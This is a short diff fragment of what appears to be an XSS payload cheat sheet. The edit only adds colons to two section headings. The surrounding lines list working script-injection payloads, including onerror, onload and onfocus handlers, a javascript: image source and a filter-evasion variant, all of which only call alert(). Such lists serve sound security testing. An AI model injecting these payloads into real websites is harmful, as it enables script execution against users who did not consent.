@@ -30,7 +30,7 @@ Basic payload:
 #"><img src=/ onerror=alert(2)>
 ```
 
-Image payload
+Image payload:
 ```
 <img src="javascript:alert('xss inj');">
 <img """><script>alert("xss inj")</script>">
@@ -39,7 +39,7 @@ Image payload
 <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
 ```
 
-HTML5 payload
+HTML5 payload:
 ```
 <body onload=alert(/xss/.source)>
 <select autofocus onfocus=alert('xss inj')>
